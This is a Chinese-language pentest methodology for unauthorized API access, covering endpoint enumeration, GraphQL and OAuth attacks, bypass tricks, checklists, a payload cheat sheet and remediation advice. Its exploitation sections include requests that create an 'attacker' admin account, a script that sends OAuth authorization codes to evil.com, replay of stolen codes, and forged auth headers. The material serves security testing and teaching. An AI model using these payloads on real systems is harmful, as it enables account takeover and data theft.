# API 未授权访问方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 API 未授权访问检测与利用流程，帮助发现因 API 认证授权机制缺失或缺陷导致的未授权访问漏洞。

## 1.2 适用范围

本文档适用于 RESTful API、GraphQL API 等各类 API 接口，特别是：
- 前后端分离的 Web 应用
- 移动应用后端 API
- 微服务架构中的服务间通信
- OAuth 认证系统

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

API 未授权访问是指 API 接口缺少适当的认证或授权检查，导致攻击者可以无需认证或越权访问 API 资源。

**本质问题**：
- API 端点缺少认证
- 认证检查不一致
- 过度暴露 API 功能
- OAuth 配置错误

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-306 | 关键功能缺少认证 |
| CWE-284 | 不当访问控制 |
| CWE-639 | 参数化访问控制不当 |
| CWE-285 | 不当授权 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| REST API | 用户/数据 API | 缺少 Token 验证 |
| GraphQL | 查询/变更操作 | 查询权限未验证 |
| 内部 API | 管理 API | 未限制访问来源 |
| 版本 API | /api/v1/, /api/v2/ | 旧版本缺少安全控制 |
| 文档 API | Swagger/OpenAPI | 文档暴露敏感信息 |
| OAuth API | 授权端点 | 配置错误导致越权 |

## 2.3 漏洞发现方法

### 2.3.1 API 端点枚举

```bash
# 常见 API 端点
GET /api/
GET /api/v1/
GET /api/v2/
GET /api/users
GET /api/admin
GET /graphql
GET /api/docs
```

### 2.3.2 认证测试

```bash
# 无认证访问 API
curl https://target.com/api/users

# 检查响应：
# - 200 OK 表示可能未授权
# - 401 表示需要认证
# - 403 表示认证但无权限
```

### 2.3.3 HTTP 方法测试

```bash
# 测试不同 HTTP 方法
GET /api/users    → 200
POST /api/users   → 401
PUT /api/users/1  → 401
DELETE /api/users/1 → 401

# 某些方法可能缺少认证
```

## 2.4 漏洞利用方法

### 2.4.1 数据窃取

```bash
# 获取所有用户数据
GET /api/users

# 获取敏感配置
GET /api/config
GET /api/settings

# 获取管理数据
GET /api/admin/users
GET /api/admin/logs
```

### 2.4.2 未授权操作

```bash
# 创建管理员账户
POST /api/users
{
    "username": "attacker",
    "role": "admin"
}

# 修改系统配置
PUT /api/settings
{
    "maintenance_mode": false
}
```

### 2.4.3 GraphQL 未授权访问

```graphql
# 查询所有用户
query {
    users {
        id
        username
        email
        role
    }
}

# 执行管理操作
mutation {
    createUser(input: {username: "attacker", role: ADMIN}) {
        id
    }
}
```

## 2.5 OAuth 弱点测试与利用

### 2.5.1 OAuth 授权服务器弱点测试

**测试目标**：检测 OAuth 授权服务器配置错误导致的未授权访问

**测试要点**：

1. **重定向 URI 验证**
```bash
# 测试开放重定向
GET /oauth/authorize?client_id=xxx&redirect_uri=https://evil.com&response_type=code

# 检查是否接受任意 redirect_uri
```

2. **授权码劫持**
```bash
# 拦截授权码并重放
GET /oauth/callback?code=INTERCEPTED_CODE

# 尝试重放已使用的授权码
```

3. **状态参数验证**
```bash
# 测试 CSRF 保护
GET /oauth/authorize?client_id=xxx&redirect_uri=https://app.com&response_type=code

# 检查是否有 state 参数
# 尝试修改 state 参数
```

4. **令牌安全性测试**
```bash
# 检查令牌强度
# 测试令牌有效期
# 尝试重放访问令牌
```

**测试步骤**：
```
1. 发起 OAuth 授权请求
2. 修改 redirect_uri 参数为攻击者控制的域名
3. 检查是否接受任意重定向 URI
4. 尝试重放授权码
5. 测试令牌的刷新机制
```

### 2.5.2 OAuth 客户端弱点测试

**测试要点**：

1. **客户端凭证存储**
```bash
# 检查前端代码中的硬编码密钥
# 检查移动应用反编译后的凭证
```

2. **隐式授权流**
```bash
# 隐式流令牌在 URL 中传输
# 可能被浏览器历史、Referer 泄露
GET /callback#access_token=xxx
```

3. **范围验证**
```bash
# 测试越权访问范围
GET /oauth/authorize?scope=admin.read admin.write

# 检查是否授予了请求的范围
```

4. **令牌存储安全**
```bash
# 检查 localStorage 中的令牌
# 检查 Cookie 中的令牌安全性
```

### 2.5.3 OAuth 未授权访问利用

**利用场景 1：开放重定向窃取授权码**
```html
<!-- 攻击者页面 -->
<script>
// 诱导用户访问 OAuth 授权页面
window.location = 'https://auth-server.com/oauth/authorize?' +
    'client_id=victim_app&' +
    'redirect_uri=https://evil.com/steal&' +
    'response_type=code';
</script>
```

**利用场景 2：授权码重放攻击**
```bash
# 截获授权码后重放
curl -X POST https://auth-server.com/oauth/token \
    -d "grant_type=authorization_code" \
    -d "code=STOLEN_CODE" \
    -d "client_id=xxx" \
    -d "client_secret=yyy"
```

**利用场景 3：范围提升攻击**
```bash
# 请求超出应用应有的范围
GET /oauth/authorize?client_id=app&scope=admin.read user.write

# 如果服务器未正确验证，可能获得额外权限
```

## 2.6 漏洞利用绕过方法

### 2.6.1 认证头绕过

```bash
# 添加伪造认证头
Authorization: Bearer fake_token
X-Api-Key: fake_key
X-Access-Token: admin
```

### 2.6.2 内部 API 访问

```bash
# 如果 API 仅限制内部 IP
# 尝试：
# - SSRF 攻击
# - HTTP 请求走私
# - 反向代理绕过
```

### 2.6.3 API 版本绕过

```bash
# 新版本有认证，旧版本可能没有
/api/v1/users  → 无认证
/api/v2/users  → 需要认证
```

### 2.6.4 HTTP 方法绕过

```bash
# 某些方法可能缺少认证检查
GET /api/users    → 401
POST /api/users   → 200 (缺少认证)
```

### 2.6.5 内容类型绕过

```bash
# 修改 Content-Type 绕过验证
Content-Type: application/json
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
```

---

# 第三部分：附录

## 3.1 API 未授权访问测试检查清单

```
□ 枚举 API 端点
□ 测试无认证访问
□ 测试不同 HTTP 方法
□ 测试 GraphQL 查询
□ 检查 API 文档暴露
□ 测试 API 版本差异
□ 测试内部 API 访问
□ 测试 OAuth 配置
□ 测试授权码流程
□ 测试令牌安全性
□ 测试范围验证
□ 测试重定向 URI
```

## 3.2 OAuth 测试检查清单

```
□ 测试 redirect_uri 验证
□ 测试授权码安全性
□ 测试 state 参数 CSRF 保护
□ 测试令牌强度和有效期
□ 测试客户端凭证存储
□ 测试隐式授权流风险
□ 测试范围验证
□ 测试令牌刷新机制
□ 测试 PKCE 实现（如适用）
```

## 3.3 常用 Payload 速查表

| 测试类型 | Payload | 说明 |
|---------|--------|------|
| 无认证访问 | `GET /api/users` | 测试端点是否需要认证 |
| HTTP 方法绕过 | `POST/PUT/DELETE` | 测试不同方法认证差异 |
| GraphQL 查询 | `query { users { id } }` | 测试 GraphQL 未授权访问 |
| OAuth 重定向 | `redirect_uri=https://evil.com` | 测试开放重定向 |
| 范围提升 | `scope=admin.read` | 测试范围验证 |

## 3.4 修复建议

1. **统一认证中间件** - 所有 API 端点经过认证检查
2. **基于角色的授权** - 实施细粒度的 API 授权
3. **API 网关** - 使用 API 网关统一管理
4. **速率限制** - 限制 API 访问频率
5. **OAuth 安全配置** - 正确配置重定向 URI、范围验证
6. **令牌安全** - 使用短有效期、实施令牌刷新
7. **PKCE** - 移动和 SPA 应用使用 PKCE

---

**参考资源**：
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [PortSwigger - API Testing](https://portswigger.net/web-security/api)
- [OWASP Testing Guide - OAuth Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [RFC 6749 - OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc6749)
